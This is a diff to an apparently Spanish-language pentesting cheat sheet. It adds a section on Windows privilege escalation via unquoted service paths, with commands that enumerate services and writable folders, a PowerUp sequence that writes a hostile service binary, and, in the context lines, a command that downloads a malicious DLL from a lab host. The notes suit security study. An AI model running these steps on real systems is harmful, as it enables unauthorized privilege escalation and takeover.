@@ -1670,7 +1670,46 @@ iwr -uri http://192.168.56.5/evildll.dll -OutFile 'C:\Ruta\Al\Binario\<FILE>.dll
 
 > Tener en cuenta, que si ejecutamos el binario con los privilegios de un usuario normal, el binario será ejecutado con esos privilegios y no es lo que queremos. Con esto en mente, no tenemos que iniciar la aplicación por nuestra cuenta. Deberemos esperar a que alguien con mayores privilegios la ejecute y active la carga de nuestra DLL maliciosa.
 
+##### Rutas de servicio sin comillas (Unquoted Service Paths)
 
+###### Orden de búsqueda
+
+```powershell
+C:\example.exe
+C:\Program Files\example.exe
+C:\Program Files\my example\example.exe
+C:\Program Files\my example\my example\example.exe
+```
+
+###### Enumeración de rutas de servicio
+
+```powershell
+# Buscamos servicios que cumplan con esta condición
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+# Comprobar si podemos iniciar/detener el servicio
+Start-Service <SERVICE>
+Stop-Service <SERVICE>
+
+# Buscar en la ruta donde se encuentra el servicio, directorios en los cuales podemos escribir para poder agregar nuestro binario malicioso 
+icacls "C:\"
+icacls "C:\Program Files"
+icacls "C:\Program Files\my example"
+
+# Iniciamos el servicio
+Start-Service <SERVICE>
+```
+
+###### Alternativa - PowerUp
+
+```powershell
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
+Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my example\example.exe"
+Start-Service <SERVICE>
+```
 
 ###  9.2. <a name='linux-2'></a>Linux
 
